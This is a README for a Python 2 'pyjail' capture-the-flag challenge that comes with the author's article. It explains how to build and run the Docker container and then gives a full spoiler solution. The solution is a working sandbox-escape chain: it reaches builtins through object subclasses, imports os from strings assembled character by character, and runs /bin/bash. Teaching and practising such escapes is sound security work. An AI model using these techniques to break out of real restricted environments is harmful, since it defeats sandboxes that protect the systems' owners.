# Article Example Pyjail

This pyjail is an example for my article on [my website](https://driikolu.fr) 

## How to launch it

First of all you must build the docker
```bash
$ docker build -t pyjail .
```

Then, you can run it
```bash
$ docker run -ti pyjail /root/jail.py
```

## What must you do

The objective of this jail is to get a shell on the docker.

Have fun :)


## Solution

**_DO NOT READ IF YOU DON'T WANT TO BE SPOILED_**
Here is only the succession of commands that I used to solved it :

```python2
for i in dir(dir()):
	x=dir(dir()).index(i)
un=x.__div__(x)
deux=un.__add__(un)
quatre=deux.__add__(deux)
onze=x.__div__(quatre)
wanted=x.__add__(onze).__add__(quatre)
warnings=().__class__.__base__.__subclasses__().pop(wanted)()
imp=warnings._module.__builtins__.values().pop(onze.__mul__(onze.__sub__(un)).__sub__(un))
moinsdeux=un.__sub__(deux).__sub__(un)
neededo_s=dir(imp).pop(moinsdeux.__sub__(un))
o=neededo_s.__getitem__(moinsdeux.__mul__(deux))
s=neededo_s.__getitem__(deux)
o_s=imp(o.__add__(s))
nbsy_s=onze.__mul__(onze.__add__(deux)).__add__(un)
s_ys=o_s.__dict__.values().pop(nbsy_s)
needed=o_s.__file__
slash=needed.__getitem__(quatre)
b=needed.__getitem__(quatre.__add__(deux).__add__(un))
i=needed.__getitem__(quatre.__add__(deux))
n=needed.__getitem__(onze.__add__(un).__add__(deux))
a=dir(o_s).pop(moinsdeux.__sub__(un)).__getitem__(un)
s=needed.__getitem__(deux)
h=needed.__getitem__(onze.__add__(un))
cmd=slash.__add__(b).__add__(i).__add__(n).__add__(slash).__add__(b).__add__(a).__add__(s).__add__(h)
s_ys(cmd)
```